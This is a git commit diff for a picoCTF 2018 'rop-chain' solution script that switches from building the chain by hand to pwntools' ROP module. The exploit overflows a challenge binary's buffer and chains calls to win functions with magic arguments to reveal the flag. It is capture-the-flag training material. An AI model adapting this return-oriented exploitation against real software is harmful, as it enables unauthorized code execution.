1c79d4491429995c1750c8c5b03a351b1541359a
Lzu Tao <1stpangu@gmail.com>
2018-10-19 03:27:26 +0700

    pico2018: Use ROP module from pwntools in pwn/rop_chain
    Signed-off-by: Lzu Tao <1stpangu@gmail.com>

--- pico2018/pwn/rop_chain/xpwn.py
+++ pico2018/pwn/rop_chain/xpwn.py
@@ -1,30 +1,27 @@
 #! /usr/bin/env python
 from pwn import process, p32, u32, context, log
-from pwn import ELF
+from pwn import ELF, ROP
 context.clear(arch='i386', os='linux')
 
 
-class ExploitInfo:
-    name    = '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
-    elf     = ELF(name)
-    #
+def main():
+    elf_name = '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
+    elf = ELF(elf_name)
     offset_buf_to_eip = 0x18 + 4
 
+    p = process(elf_name)
 
-def main():
-    p = process(ExploitInfo.name)
+    rop_chain = ROP(elf)
+    rop_chain.win_function1()
+    rop_chain.win_function2(0xBAAAAAAD)
+    rop_chain.flag(0xDEADBAAD)
 
-    rop_chain = p32(ExploitInfo.elf.symbols['win_function1'])
-    rop_chain += p32(ExploitInfo.elf.symbols['win_function2'])
-    rop_chain += p32(ExploitInfo.elf.symbols['flag'])
-    rop_chain += p32(0xBAAAAAAD)
-    rop_chain += p32(0xDEADBAAD)
-    log.info(rop_chain)
+    log.info(rop_chain.dump())
 
-    payload = 'A' * ExploitInfo.offset_buf_to_eip
-    payload += rop_chain
-    p.clean()
-    p.sendline(payload)
+    payload = 'A' * offset_buf_to_eip
+    payload += str(rop_chain)
+    assert('\n' not in payload)
+    p.sendlineafter('input> ', payload)
 
     print(p.recv(4096))
 
